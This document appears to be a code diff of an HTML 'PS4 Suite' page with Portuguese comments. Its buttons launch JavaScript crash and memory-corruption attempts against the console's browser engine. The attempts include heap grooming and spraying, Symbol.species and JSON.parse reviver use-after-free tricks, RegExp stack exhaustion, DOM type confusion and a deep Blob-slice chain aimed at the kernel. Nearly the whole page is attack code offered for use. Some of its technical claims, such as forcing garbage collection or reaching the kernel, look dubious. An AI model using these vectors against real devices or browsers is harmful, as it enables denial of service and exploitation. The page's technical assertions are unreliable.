@@ -2,208 +2,282 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Suite</title>
-
+<title>PS4 Suite v120000: Precision II</title>
+<style>
+    body { background: #1a1a1a; color: #ddd; font-family: monospace; padding: 10px; }
+    button { 
+        display: block; width: 100%; padding: 15px; margin: 5px 0; 
+        background: #333; color: #fff; border: 1px solid #555; 
+        text-align: left; cursor: pointer; font-size: 16px;
+    }
+    button:active { background: #d00; border-color: #f00; }
+    #log { 
+        border: 1px solid #0f0; background: #000; color: #0f0; 
+        padding: 10px; height: 300px; overflow-y: scroll; white-space: pre-wrap; 
+    }
+</style>
 </head>
 <body>
 
-<h1>v110000: PRECISION CRASHING</h1>
-<div id="console">Sistema pronto. Selecione um vetor de ataque...</div>
+<h1>v120000: PRECISION VECTORS II</h1>
+<div id="log">Aguardando comando...</div>
 
-<button class="panic" onclick="run(k01)">01. Kernel Stack Exhaustion (JSON Recursion)</button>
-<button class="panic" onclick="run(k02)">02. Kernel Map Exhaustion (Huge ArrayBuffer Flood)</button>
+<button onclick="run(a01)">01. TypedArray Overlapping Copy (Memmove Fail)</button>
+<button onclick="run(a02)">02. Array.splice Holey Array Grooming</button>
+<button onclick="run(a03)">03. Float64 Array OOB via Prototype Poisoning</button>
 
-<button class="uaf" onclick="run(u01)">03. Styled-Element Groomed UAF</button>
-<button class="uaf" onclick="run(u02)">04. Large String Rope Flattening (OOM Crash)</button>
-<button class="uaf" onclick="run(u03)">05. Array.concat Species Confusion (Size Mismatch)</button>
+<button onclick="run(p01)">04. JSON.parse Reviver UAF (The Classic)</button>
+<button onclick="run(p02)">05. RegExp Backtracking Stack Smash</button>
+<button onclick="run(p03)">06. URI Decode URIError Stack Recursion</button>
+
+<button onclick="run(d01)">07. EventListener Object handleEvent Type Confusion</button>
+<button onclick="run(d02)">08. DOMNodeRemoved Recursive Layout Thrash</button>
+<button onclick="run(d03)">09. Select Element Options Collection Length UAF</button>
+
+<button onclick="run(k01)">10. Blob Slice Depth Recursion (Kernel Stack)</button>
 
 <script>
-    const C = document.getElementById('console');
-    function log(msg) { C.innerText += "\n[+] " + msg; C.scrollTop = C.scrollHeight; }
+    const L = document.getElementById('log');
+    function log(msg) { L.innerHTML += "[+] " + msg + "\n"; L.scrollTop = L.scrollHeight; }
 
     function run(fn) {
-        C.innerText = "Iniciando " + fn.name + "...";
+        L.innerHTML += "\n--- Executing " + fn.name + " ---\n";
+        // Pre-Grooming: Limpa memória antes do teste
+        pressure();
         setTimeout(() => {
-            try { fn(); } catch(e) { log("Falha: " + e.message); }
+            try { fn(); } catch(e) { log("Erro Seguro: " + e.message); }
         }, 100);
     }
 
     // =================================================================
-    // 01. KERNEL STACK EXHAUSTION (Panic Vector)
-    // Objetivo: Forçar o Kernel a consumir toda a pilha de execução ao 
-    // tentar serializar um objeto JSON absurdamente profundo.
+    // 01. TypedArray Overlapping Copy
+    // Tenta enganar o kernel usando o método .set() em regiões sobrepostas
+    // do mesmo buffer. Se a implementação usar memcpy em vez de memmove,
+    // os dados se corrompem.
     // =================================================================
-    function k01() {
-        log("Criando objeto de profundidade 30.000...");
-        let depth = 100000; // Profundidade agressiva
-        let structure = {a: 1};
+    function a01() {
+        const len = 0x1000;
+        const buf = new ArrayBuffer(len);
+        const view = new Uint8Array(buf);
         
-        // Cria lista encadeada profunda
-        for (let i = 0; i < depth; i++) {
-            structure = { [i]: structure };
-        }
+        // Padrão reconhecível
+        for(let i=0; i<len; i++) view[i] = i % 255;
 
-        log("Disparando JSON.stringify (C++ Stack Smash)...");
-        // Isso força recursão na engine C++. Se não houver verificação de limite,
-        // estoura a Stack e mata o processo ou o Kernel.
-        JSON.stringify(structure);
-        log("Sobreviveu. Aumente 'depth' no código.");
+        // Grooming: criar views adjacentes
+        const v1 = new Uint8Array(buf, 0, len - 10);
+        const v2 = new Uint8Array(buf, 10, len - 10);
+
+        log("Disparando overlapping copy...");
+        // Copia v1 para cima de v2 (que aponta para a mesma memória deslocada)
+        // Se falhar, corrompe o buffer subjacente.
+        v2.set(v1);
+        
+        // Verificação simples de integridade
+        if(view[10] !== view[0]) log("Dados copiados (Comportamento esperado)");
+        else log("Alerta: Cópia pode ter falhado silenciosamente.");
     }
 
     // =================================================================
-    // 02. KERNEL MAP EXHAUSTION (Panic Vector)
-    // Objetivo: Esgotar a tabela de mapeamento de memória do Kernel
-    // criando milhares de alocações grandes que usam mmap() internamente.
+    // 02. Array.splice Holey Array Grooming
+    // Cria arrays com "buracos" (HOLEY_ELEMENTS) e tenta forçar o motor
+    // a ler memória não inicializada nesses buracos.
     // =================================================================
-    function k02() {
-        log("Iniciando alocação massiva (mmap stress)...");
-        const maps = [];
-        const CHUNK_SIZE = 1024 * 1024 * 2; // 2MB (Tamanho de página grande)
+    function a02() {
+        const arr = new Array(10000).fill(1.1);
+        // Cria buracos alternados
+        for(let i=0; i<10000; i+=2) delete arr[i];
+
+        log("Shift/Splice em Holey Array...");
+        // Shift move elementos. Se o motor não checar se o destino é um buraco,
+        // pode vazar ponteiros antigos.
+        arr.shift(); 
         
-        const timer = setInterval(() => {
-            try {
-                // Aloca e preenche para forçar "commit" da memória física
-                const ab = new ArrayBuffer(CHUNK_SIZE);
-                const view = new Uint8Array(ab);
-                view[0] = 0xAA;
-                view[CHUNK_SIZE - 1] = 0xBB;
-                maps.push(ab);
-                
-                log(`Alocado: ${maps.length * 2} MB`);
-                
-                // Em ~1GB ou ~2GB, o navegador deve crashar por falta de memória (OOM)
-                // ou o Kernel entra em pânico por falta de entradas na tabela de páginas.
-            } catch(e) {
-                clearInterval(timer);
-                log("Limite de memória atingido ou Crash evitado.");
+        pressure(); // Força GC para limpar os slots vazios
+        
+        // Acesso arriscado
+        const val = arr[0];
+        log("Leitura realizada: " + val);
+    }
+
+    // =================================================================
+    // 03. Float64 Array OOB via Prototype Poisoning
+    // Tenta interceptar a leitura do construtor para criar um array
+    // menor do que o motor espera.
+    // =================================================================
+    function a03() {
+        function Dummy() {}
+        Dummy.prototype = Float64Array.prototype;
+        
+        const arr = new Float64Array(100);
+        arr.constructor = {
+            [Symbol.species]: function(len) {
+                log("Interceptado! Retornando array minúsculo...");
+                return new Float64Array(0); // Tamanho 0
             }
-        }, 10);
-    }
-
-    // =================================================================
-    // 03. STYLED-ELEMENT GROOMED UAF (WebKit Crash)
-    // Objetivo: Usar Heap Grooming para alinhar um objeto HTMLDivElement
-    // liberado com um ArrayBuffer do mesmo tamanho.
-    // =================================================================
-    function u01() {
-        log("Fase 1: Heap Grooming (Limpando o terreno)...");
-        const keep = [];
-        const free = [];
-        
-        // Criar muitos objetos para desfragmentar o heap
-        for(let i=0; i<5000; i++) {
-            const d = document.createElement('div');
-            d.setAttribute('id', 'groom'+i); // Força alocação de propriedades
-            keep.push(d);
-        }
-
-        log("Fase 2: Criando buracos (Free)...");
-        // Libera metade para criar slots livres de tamanho previsível
-        for(let i=0; i<keep.length; i+=2) {
-            keep[i] = null; 
-        }
-
-        // Força GC (Tentativa)
-        pressure(); 
-
-        log("Fase 3: O Alvo (Vítima)...");
-        // Cria o objeto que vamos tentar corromper
-        let victim = document.createElement('div');
-        victim.id = "target";
-        keep.push(victim);
-
-        log("Fase 4: Disparando UAF...");
-        // Remove a vítima
-        victim.remove();
-        victim = null;
-
-        pressure(); // Força GC da vítima
-
-        // HEAP SPRAY: Tenta preencher o slot da vítima com dados controlados
-        // Um HTMLElement tem um tamanho específico em C++. 
-        // ArrayBuffers pequenos muitas vezes caem no mesmo "Slab" de alocação.
-        const spray = [];
-        for(let i=0; i<5000; i++) {
-            // Tamanho estimado de um objeto DOM simples (~64-128 bytes)
-            const b = new Uint32Array(16); 
-            b.fill(0x41414141); // 'AAAA'
-            spray.push(b);
-        }
-
-        log("Se não crashou, o alinhamento falhou. Tente ajustar o tamanho do Uint32Array.");
-    }
-
-    // =================================================================
-    // 04. LARGE STRING ROPE FLATTENING (OOM Crash)
-    // Objetivo: Criar uma string não-linear (Rope) gigante e forçar
-    // sua linearização em um espaço de memória contíguo inexistente.
-    // =================================================================
-    function u02() {
-        log("Construindo 'Rope' gigante (Lazy allocation)...");
-        let s = "A";
-        // Constrói árvore exponencial 2^28
-        // Isso é rápido porque WebKit não aloca memória real na concatenação (lazy)
-        for(let i=0; i<28; i++) {
-            s += s;
-        }
-        log("Tamanho virtual: " + s.length);
-        
-        log("Forçando Flattening (Commit de memória)...");
-        // Acessar um caractere ou usar regex força o WebKit a alocar 
-        // um bloco contíguo gigante de RAM.
-        try {
-            // Deve causar crash imediato por falha de alocação ou corrupção
-            const char = s.charAt(s.length - 1); 
-            log("Falha: O sistema lidou com a memória.");
-        } catch(e) {
-            log("Erro capturado (OOM seguro): " + e.message);
-        }
-    }
-
-    // =================================================================
-    // 05. ARRAY.CONCAT SPECIES CONFUSION (Type Confusion)
-    // Objetivo: Confundir o motor fazendo-o pensar que está copiando um Array,
-    // mas entregando um Proxy que altera o tamanho durante a cópia.
-    // =================================================================
-    function u03() {
-        log("Preparando Array Species Attack...");
-        
-        const params = {
-            length: 100000, // Tamanho inicial grande
-            // Quando a engine perguntar o elemento 0, diminuímos o tamanho
-            0: 1
         };
+
+        log("Executando map()...");
+        // map() usa Symbol.species para criar o novo array.
+        // Se o C++ assumir que o novo array tem tamanho 100, mas JS retornou 0...
+        // ...temos um Heap Overflow na escrita.
+        arr.map(x => x + 1);
+    }
+
+    // =================================================================
+    // 04. JSON.parse Reviver UAF (Classic)
+    // O "Reviver" roda enquanto o objeto ainda está sendo construído.
+    // Usamos isso para deletar o objeto pai enquanto processamos o filho.
+    // =================================================================
+    function p01() {
+        const json = '{"a": {"b": 1}, "c": 2}';
         
-        const p = new Proxy(params, {
-            get(target, prop) {
-                if (prop === '0') {
-                    log("Trap ativado! Reduzindo length...");
-                    target.length = 0; // Zera o tamanho no meio da operação
-                    return 0x41414141;
-                }
-                return target[prop];
-            },
-            has(target, prop) { return true; } // Finge ter todas as propriedades
+        log("Parsing JSON com Reviver malicioso...");
+        const o = JSON.parse(json, function(k, v) {
+            if (k === "b") {
+                log("Reviver: Deletando referência pai...");
+                // Aqui tentamos "soltar" o objeto sendo construído
+                this.a = null; 
+                pressure(); // GC agressivo
+                
+                // Tenta retornar um objeto que vai ocupar o lugar na memória
+                return { poisoned: 0x41414141 }; 
+            }
+            return v;
+        });
+    }
+
+    // =================================================================
+    // 05. RegExp Backtracking Stack Smash
+    // Cria uma Regex com aninhamento profundo de grupos opcionais.
+    // Em strings que não dão match, o backtracking pode estourar a pilha.
+    // =================================================================
+    function p02() {
+        log("Gerando Regex Stack Killer...");
+        // (a?)(a?)(a?)...
+        let p = "";
+        for(let i=0; i<2000; i++) p += "(a?)";
+        const re = new RegExp(p + "b"); // 'b' força backtracking total
+        const str = "a".repeat(2000);
+        
+        log("Executando match (Pode travar)...");
+        re.exec(str);
+    }
+
+    // =================================================================
+    // 06. URI Decode URIError Stack Recursion
+    // Explora a geração de Stack Trace em erros recursivos.
+    // =================================================================
+    function p03() {
+        function recurse() {
+            try {
+                decodeURIComponent("%"); // Lança URIError
+            } catch(e) {
+                recurse(); // Recurso infinita no catch
+            }
+        }
+        log("Iniciando recursão de erro...");
+        recurse();
+    }
+
+    // =================================================================
+    // 07. EventListener Object handleEvent Type Confusion
+    // Passa um objeto com método handleEvent em vez de função.
+    // Modifica o objeto para algo inválido durante o disparo.
+    // =================================================================
+    function d01() {
+        const div = document.createElement('div');
+        const handler = {
+            handleEvent: function(e) {
+                log("Evento disparado. Corrompendo handler...");
+                // Transforma o handler em um Array para confundir tipos na próxima chamada
+                delete this.handleEvent;
+                this[0] = 1.1;
+            }
+        };
+        div.addEventListener('click', handler);
+        div.click();
+        // Dispara de novo para pegar o objeto em estado inválido
+        div.click();
+    }
+
+    // =================================================================
+    // 08. DOMNodeRemoved Recursive Layout Thrash
+    // Remove um nó, que dispara um evento, que remove outro nó...
+    // Tenta corromper a árvore de renderização.
+    // =================================================================
+    function d02() {
+        const root = document.createElement('div');
+        document.body.appendChild(root);
+        const child = document.createElement('span');
+        root.appendChild(child);
+
+        root.addEventListener('DOMNodeRemoved', (e) => {
+            log("Nó removido. Forçando layout síncrono...");
+            // Acessar offsetHeight força recálculo de layout em árvore suja
+            const h = document.body.offsetHeight;
+            root.remove(); // Remove o pai durante a remoção do filho
         });
 
-        // Engana a engine para tratar 'p' como Array
-        p[Symbol.isConcatSpreadable] = true;
-
-        log("Executando concat (Pode crashar)...");
-        const buffer = new Array(100);
-        // concat vai ler o length (100k), alocar memória, começar a copiar...
-        // ... bater na trap '0', zerar o length original, e continuar escrevendo.
-        buffer.concat(p); 
+        child.remove(); // Gatilho
     }
 
-    // Função Auxiliar de Pressão de GC
+    // =================================================================
+    // 09. Select Element Options Collection Length UAF
+    // Diminui o tamanho de uma coleção HTMLOptionsCollection
+    // forçando a liberação dos objetos Option.
+    // =================================================================
+    function d03() {
+        const sel = document.createElement('select');
+        // Cria 100 opções
+        sel.length = 100;
+        const optRef = sel.options[50]; // Guarda referência
+        
+        log("Truncando select length...");
+        sel.length = 10; // Isso libera as opções 10-99
+        
+        pressure(); // GC
+        
+        // Acessa referência antiga
+        optRef.text = "UAF Check";
+    }
+
+    // =================================================================
+    // 10. Blob Slice Depth Recursion
+    // Cria uma cadeia de referência de Blobs (Slice do Slice do Slice...)
+    // O Kernel precisa resolver essa cadeia. Se for muito funda, Panics.
+    // =================================================================
+    function k01() {
+        log("Construindo Blob Chain (Kernel Stack)...");
+        let b = new Blob(["A".repeat(1024)]);
+        
+        // Profundidade 5000 (Geralmente o limite é menor)
+        for(let i=0; i<5000; i++) {
+            b = b.slice(0, 1024);
+        }
+        
+        log("Lendo Blob final (Trigger)...");
+        const fr = new FileReader();
+        fr.readAsText(b);
+    }
+
+    // --- HEAP GROOMING HELPER ---
+    // Cria alocações temporárias para acordar o GC e preencher buracos
     function pressure() {
         const trash = [];
-        for(let i=0; i<500; i++) trash.push(new ArrayBuffer(64 * 1024));
-        trash.length = 0;
+        // Aloca 10MB em pedaços de 128KB
+        for(let i=0; i<80; i++) {
+            trash.push(new ArrayBuffer(128 * 1024));
+        }
+        // Spray de objetos pequenos
+        const spray = [];
+        for(let i=0; i<1000; i++) {
+            spray.push({a: 1, b: 2, c: 3, d: 4});
+        }
+        trash.length = 0; // Libera buffer grande
+        // Mantém spray pequeno vivo por um momento
+        return spray; 
     }
 
 </script>
 </body>
 </html>
-
